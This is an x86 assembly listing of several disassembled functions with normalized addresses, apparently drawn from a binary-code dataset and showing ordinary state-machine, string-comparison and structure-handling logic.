push 0x7c
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x19
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] 0x1
call sub_1006e640
add esp 0x58
test eax eax
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
mov eax 0x19
mov ecx esi
call sub_1006ed00
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1006ee00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0xc ]
push edi
mov edi [ ebx + 0xc ]
dec edi
mov [ ebx + 0x3c ] 0x0
js r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esp [ esp ]
push 0x96
push 0x21
push 0x22
push esi
call sub_1006d8f0
add esp 0x10
test eax eax
jne r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x1c ]
mov ecx [ ebp + 0x8 ]
push edx
call sub_1006ed00
add esp 0x4
mov ecx esi
call sub_1006ebe0
test eax eax
je r-xdata
cmp [ esi + 0x1c ] 0x1f
jne r-xdata
dec edi
jns r-xdata
push 0x96
push 0x19
push 0x26
push 0x18
push esi
call sub_1006d8f0
add esp 0x14
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebx + 0x8 ]
mov esi [ ecx + edi * 4 ]
je r-xdata
pop esi
pop edi
pop ebx
pop ebp
retn
pop esi
sub_1006ee90
push ebp
mov ebp esp
push ecx
push esi
add eax 0x4c
xor esi esi
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x20 ] esi
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_10059bc0
add esp 0x8
pop esi
mov esp ebp
pop ebp
retn
push ebx
inc esi
cmp esi [ edi + 0x20 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push ebx
push edx
call sub_100049a0
mov eax [ edi + 0x1c ]
add esp 0xc
mov [ eax + esi * 4 ] 0x0
mov ecx [ edi + 0x1c ]
mov ebx [ ecx + esi * 4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
push edx
push eax
call sub_1005a810
add esp 0x8
test eax eax
jne r-xdata
pop ebx
sub_1006ef00
push ebp
mov ebp esp
push ecx
push ebx
push esi
add eax 0x1c
push edi
mov [ ebp - 0x4 ] eax
mov edi rw-data
mov ebx 0xc
add edi 0xc
dec ebx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10035fe0
mov edx [ edi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] edx
mov eax [ edi ]
push eax
push ecx
call sub_1000ad70
add esp 0x10
mov [ esi + 0x4 ] eax
mov ecx [ edi - 0x4 ]
mov edx [ ebp - 0x4 ]
push ecx
push edx
call sub_1005a810
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1006ef60
push ebp
mov ebp esp
push ebx
push esi
push edi
lea ebx [ eax + 0x1c ]
xor esi esi
jmp r-xdata
mov eax [ esi + rw-data ]
push eax
push ebx
call sub_1005a810
mov edi eax
add esp 0x8
test edi edi
je r-xdata
add esi 0x10
cmp esi 0x3e0
jb r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call sub_10035fe0
mov eax [ esi + rw-data ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1000ad70
add esp 0x10
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1006efc0
push esi
add eax 0x1c
push r--data
push eax
call sub_1005a810
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi + 0x4 ]
push ecx
push edi
call sub_10035fe0
push r--data
push edi
call sub_1000ad70
add esp 0x10
mov [ esi + 0x4 ] eax
sub_1006f000
push ebp
mov ebp esp
mov ecx [ eax ]
mov eax [ esi + 0x4 ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov eax [ esi + 0x8 ]
cmp [ esi + 0x14 ] eax
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov eax 0x1
pop ebp
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006f080
push ebp
mov ebp esp
mov eax [ ebx + 0x18 ]
push esi
lea esi [ ebx + 0x18 ]
push edi
mov ecx r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_1006d7e0
add esp 0x4
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp [ esi + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ r--data ]
mov eax edi
cmp [ esi + 0x14 ] 0x0
je r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx r--data
mov edi edi
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov ecx [ r--data ]
mov eax edi
mov ecx [ r--data ]
mov eax [ esi + 0x8 ]
lea ebx [ ebx ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push 0x0
push r--data
mov eax r--data
call sub_1006f000
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ r--data ]
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push eax
push r--data
mov eax r--data
call sub_1006f000
add esp 0x8
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006f230
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax + 0xc ]
push r--data
mov [ ebp - 0x4 ] edi
call sub_1003bee0
add esp 0x4
mov [ ebp - 0x20 ] 0x0
push r--data
call sub_1003bee0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x14 ]
lea ecx [ ecx + eax * 4 ]
push r--data
call sub_1003bee0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x1
jne r-xdata
sub ecx 0x4
dec eax
jns r-xdata
mov edx [ ebp + 0x10 ]
cmp [ ebx + 0x1c ] edx
je r-xdata
mov ebx [ ecx ]
mov [ ebp - 0x1c ] ebx
cmp ebx r--data
je r-xdata
add edi 0x8
push ebx
push edi
call sub_10035e90
mov esi eax
mov eax [ ebp + 0x10 ]
add esp 0x8
push esi
push eax
call sub_10045960
add esp 0x4
push eax
push r--data
call sub_1003bee0
add esp 0xc
cmp esi 0xffffffff
je r-xdata
push r--data
call sub_1003bee0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
add eax 0x14
push eax
push ebx
push ecx
call sub_1001b720
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
mov ecx [ ebx + 0x1c ]
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov eax 0x1
push 0x7c
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
push 0x0
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x3c ] edx
call sub_1006e640
add esp 0x54
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push edx
call sub_1006d7e0
push r--data
call sub_1003bee0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
call sub_1006d5e0
cmp ebx eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
cmp esi [ eax + 0xc ]
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push edx
call sub_1006d7e0
add esp 0x4
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_1006d5e0
cmp eax ebx
je r-xdata
mov ecx [ edi ]
mov edx [ ebp - 0x8 ]
mov esi [ ecx + edx * 4 ]
mov ecx esi
mov [ ebp - 0xc ] esi
call sub_1006ebe0
test eax eax
jne r-xdata
mov eax esi
call sub_1006dc90
mov edx [ ebp - 0x4 ]
add edx 0x14
push edx
push ebx
push esi
call sub_1001b720
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_1006dc90
mov eax esi
call sub_1006d5e0
cmp eax ebx
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ecx + 0xc ]
jb r-xdata
push ebx
push edi
call sub_10035e90
mov edx [ edi ]
mov ecx [ esi + 0x1c ]
mov eax [ edx + eax * 4 - 0x4 ]
push ecx
mov [ ebp - 0x18 ] eax
call sub_10045960
mov edx [ ebp - 0x18 ]
add esp 0xc
push eax
mov eax [ edx + 0x1c ]
push eax
call sub_10045960
add esp 0x4
push eax
push r--data
call sub_1003bee0
mov eax [ ebp - 0x4 ]
add eax 0x14
push ebx
push eax
call sub_10035e90
push esi
push edi
mov [ ebp - 0x8 ] eax
mov ebx esi
call sub_10035e90
add esp 0x1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov esi [ ecx + edi * 4 - 0x4 ]
dec edi
add eax 0x14
push esi
push eax
mov [ ebp - 0x10 ] edi
call sub_10035e90
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov edi esi
cmp esi [ ebp - 0x1c ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
add eax 0x8
push eax
push edi
push edx
call sub_1002ad70
jmp r-xdata
mov ecx [ ebx + 0x1c ]
push ecx
call sub_10045960
push eax
push r--data
call sub_1003bee0
mov esi [ ebx + 0x4 ]
add esp 0xc
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
push esi
push eax
call sub_10035e90
push 0x100
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1002cbc0
mov ecx [ ebp - 0x24 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov [ edx + ecx * 4 ] esi
mov eax [ eax + 0x8 ]
add esp 0x14
mov [ eax + edi * 4 ] esi
cmp ebx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x14 ]
inc eax
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp eax 0x3
jl r-xdata
mov edi [ ebp + 0x8 ]
add esi 0x10
push ebx
push esi
call sub_10035e90
mov edi [ ebp + 0x8 ]
push esi
push eax
push edi
mov [ ebp - 0x24 ] eax
call sub_1002ad70
mov eax [ ebp - 0x24 ]
add esp 0x14
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0xffffffff
cmp eax [ esi + 0x4 ]
jae r-xdata
mov edi [ ebx + 0x4 ]
or [ ebx + 0xc ] 0x200
test edi edi
je r-xdata
inc ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x8
push esi
push eax
call sub_10035e90
mov esi [ ebp - 0x10 ]
mov edi eax
push esi
push edi
push r--data
call sub_1003bee0
add esp 0x14
cmp edi 0xffffffff
jne r-xdata
mov edx [ esi + 0x1c ]
push edx
call sub_10045960
push eax
push r--data
call sub_1003bee0
add esp 0xc
lea eax [ esi + 0x10 ]
push eax
mov [ ebx + 0x4 ] esi
mov ecx [ eax + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] ecx
call sub_100049a0
add esp 0xc
push r--data
call sub_1003bee0
push edi
call sub_1006da20
add esp 0x8
jmp r-xdata
mov esi [ ebp - 0x18 ]
or [ ebx + 0xc ] 0x200
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push esi
call sub_1006d8f0
add esp 0x1c
test eax eax
je r-xdata
lea esp [ esp ]
lea eax [ esi + 0x10 ]
push eax
mov [ ebx + 0x4 ] esi
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov [ ebx + 0x8 ] edx
call sub_100049a0
mov ebx esi
add edi 0x10
push ebx
push edi
call sub_10035e90
mov ecx [ ebp + 0x8 ]
push edi
push eax
push ecx
mov [ ebp - 0x24 ] eax
call sub_1002ad70
mov eax [ ebp - 0x24 ]
add esp 0x14
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0xffffffff
cmp eax [ edi + 0x4 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
push eax
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x4 ]
push esi
push edi
mov [ esi + 0x8 ] edx
call sub_100049a0
mov eax [ ebp - 0x4 ]
add eax 0x14
push ebx
push eax
mov [ ebp - 0x1c ] eax
call sub_10035e90
add esp 0x14
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp - 0x30 ]
mov edx [ edx + ecx * 4 ]
inc ecx
mov [ edx + 0x4 ] esi
cmp ecx [ ebp - 0x2c ]
jb r-xdata
mov ebx [ ebp - 0x1c ]
push 0x100
push ebx
push edi
call sub_1002cbc0
or [ ebx + 0xc ] 0x2
mov esi eax
mov eax [ esi + 0x18 ]
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
add eax 0x10
mov [ ebp - 0x2c ] edx
mov edx [ eax ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x8 ]
mov [ esi + 0x18 ] edx
mov edx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x14 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x28 ] ecx
add esp 0xc
xor ecx ecx
mov [ ebp - 0x2c ] edx
test edx edx
je r-xdata
mov edx [ esi ]
mov ecx [ edx + eax * 4 ]
mov [ ecx + 0x8 ] eax
inc eax
cmp eax [ esi + 0x4 ]
jb r-xdata
jmp r-xdata
lea esp [ esp ]
mov ecx [ ebp - 0x1c ]
push ecx
push eax
push edi
call sub_1002ad70
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
push edx
push eax
push esi
push edi
call sub_10041090
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
push ebx
push edi
mov [ ebp - 0x24 ] eax
call sub_1001b720
mov ecx [ ebp - 0xc ]
mov ebx [ ebp - 0x24 ]
push ecx
push ebx
call sub_10035e90
push ebx
inc eax
push eax
push esi
push edi
call sub_10041090
mov eax [ ebp - 0x20 ]
inc eax
add esp 0x40
mov [ ebp - 0x20 ] eax
cmp eax 0x8
jge r-xdata
dec [ ebp - 0x8 ]
mov edx [ edi ]
mov ecx [ edx + eax * 4 ]
mov [ ecx + 0x8 ] eax
inc eax
cmp eax [ edi + 0x4 ]
jb r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
dec eax
js r-xdata
sub_1006f780
push esi
push edi
mov edi eax
call sub_1006db30
mov esi [ edi + 0xc ]
mov eax edi
call sub_1006dc90
test eax eax
je r-xdata
mov eax edi
call sub_1006dc90
test eax eax
jne r-xdata
cmp [ eax ] 0x1
jne r-xdata
pop edi
pop esi
retn
or [ eax + 0xc ] 0x2
mov ecx [ eax + 0x1c ]
cmp ecx 0xa
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x6c ] 0x0
jne r-xdata
cmp [ esi + 0x70 ] ecx
jne r-xdata
mov eax edi
call sub_1006dc90
test eax eax
jne r-xdata
sub_1006f7d0
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx 0x4
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_10059bc0
add esp 0x8
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
test ecx ecx
jne r-xdata
mov esi eax
mov eax edi
call sub_1006dd70
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
push edi
call sub_1006d7e0
mov eax 0x1
mov [ ebx + 0x2c ] eax
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx ] eax
mov ecx [ edi + 0xc ]
pop esi
pop edi
mov [ ecx + 0x34 ] eax
pop ebx
pop ebp
retn
mov [ ebx + 0x1c ] 0x1
mov ecx [ eax + 0x18 ]
lea esi [ eax + 0x18 ]
mov [ ebx + 0x20 ] ecx
mov edx [ eax + 0x1c ]
mov [ ebx + 0x24 ] edx
mov eax [ eax + 0x20 ]
mov [ ebx + 0x28 ] eax
call sub_1006e570
mov [ ebx + 0x2c ] eax
mov ecx [ edi + 0xc ]
mov ebx [ ebp + 0xc ]
push edi
mov [ ecx ] 0x1
call sub_1006f080
add esp 0x4
pop esi
pop edi
pop ebx
pop ebp
retn
sub_1006f880
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
test eax eax
jne r-xdata
push ebx
cmp eax 0x3
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10059bc0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
mov ebx [ edx ]
call sub_1006dd70
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push eax
call sub_10059bc0
add esp 0x8
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp eax 0x2
jne r-xdata
xor ecx ecx
cmp [ esi + 0x18 ] ecx
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
mov eax 0x8
mov ecx esi
call sub_1006e0e0
mov edx [ esi + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax ] 0x2
mov ecx [ esi + 0xc ]
pop ebx
pop edi
mov [ ecx + 0x34 ] 0x1
mov eax 0x1
pop esi
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x1
push 0x0
mov eax esi
call sub_1006d8a0
add esp 0x18
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi esi
call sub_1006e0a0
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebx + 0xc ]
pop ebx
pop edi
mov [ edx ] 0x2
mov eax 0x1
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10059bc0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1006f9a0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
test eax eax
jne r-xdata
push ebx
cmp eax 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov esi 0x1
cmp eax esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov ecx [ edx + 0x68 ]
push ecx
push eax
call sub_10059bc0
add esp 0x8
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_1006dd70
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_1006dd70
lea eax [ ebx + 0x1 ]
pop ebx
pop edi
pop esi
pop ebp
retn
cmp eax 0x2
jne r-xdata
xor ecx ecx
cmp [ edi + 0x18 ] esi
sete cl
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
push esi
mov eax 0x8
mov ecx edi
call sub_1006e0e0
mov ecx [ edi + 0xc ]
mov [ ecx ] 0x3
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx + 0x2c ] eax
mov eax [ edi + 0xc ]
pop ebx
mov [ eax + 0x34 ] esi
pop edi
mov eax esi
pop esi
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push esi
push 0x0
mov eax edi
call sub_1006d8a0
add esp 0x18
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006e0a0
mov edx [ ebx + 0xc ]
mov [ edx ] 0x3
mov ecx [ ebx + 0xc ]
pop ebx
mov [ ecx + 0x2c ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1006fae0
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi ]
cmp ebx 0x4
jne r-xdata
push esi
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_1006e240
pop edi
lea eax [ ebx - 0x3 ]
pop ebx
pop ebp
retn
cmp ebx 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
pop esi
pop edi
xor eax eax
pop ebx
pop ebp
retn
mov esi 0x1
cmp ebx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
push 0x96
push 0x4
push 0x7b
push 0x7e
push 0x8b
push 0x3
push esi
mov eax edi
call sub_1006d8a0
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
cmp [ edi + 0x18 ] eax
sete al
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_1006dd70
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
mov esi edi
mov ebx edx
call sub_1006dd70
pop esi
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
pop ebp
retn
cmp ebx esi
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006e0a0
mov eax ebx
call sub_1006dc90
mov eax [ ebx + 0xc ]
mov [ eax + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_1006fe10
add esp 0x8
pop esi
pop edi
pop ebx
pop ebp
retn
push 0x96
push 0x6
push 0x82
push esi
mov eax edi
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x5
sete cl
test ecx ecx
je r-xdata
cmp ebx esi
jne r-xdata
push 0x4
jmp r-xdata
xor edx edx
cmp eax 0x2
sete dl
mov eax edx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006e0a0
mov eax ebx
call sub_1006dc90
mov ecx [ ebx + 0xc ]
mov [ ecx + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
cmp ebx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x8
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax edi
call sub_1006e2a0
add esp 0x4
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
push 0x2
jmp r-xdata
cmp ebx esi
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] esi
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x7
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006e0a0
mov eax [ ebx + 0xc ]
mov [ eax ] 0x4
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
cmp ebx 0x2
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] esi
sete al
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_1006dc90
mov edx [ edi + 0xc ]
mov eax esi
pop esi
pop edi
mov [ edx ] 0x5
pop ebx
pop ebp
retn
push 0x5
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_1006dc90
mov edx [ edi + 0xc ]
mov [ edx ] 0x5
mov eax [ edi + 0xc ]
mov [ eax + 0x34 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x0
mov eax edi
call sub_1006d8a0
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov eax edi
call sub_1006d7e0
add esp 0x4
pop esi
pop edi
xor eax eax
pop ebx
pop ebp
retn
sub_1006fd10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x5
ja r-xdata
push esi
push edi
call sub_10035fe0
add esp 0x8
pop edi
pop esi
pop ebp
retn
push ebx
jmp [ eax * 4 + jump_table_1006fdf8 ]
xor ebx ebx
cmp [ esi + 0x14 ] ebx
jbe r-xdata
xor ebx ebx
cmp [ esi + 0x50 ] ebx
jbe r-xdata
mov eax [ esi + 0x10 ]
push eax
mov edx [ esi + 0x10 ]
push edx
push edi
call sub_10035fe0
mov eax [ esi + 0x20 ]
push eax
push edi
call sub_10035fe0
mov ecx [ esi + 0x24 ]
push ecx
push edi
call sub_10035fe0
mov edx [ esi + 0x28 ]
push edx
push edi
call sub_10035fe0
add esp 0x20
pop ebx
push esi
push edi
call sub_10035fe0
add esp 0x8
pop edi
pop esi
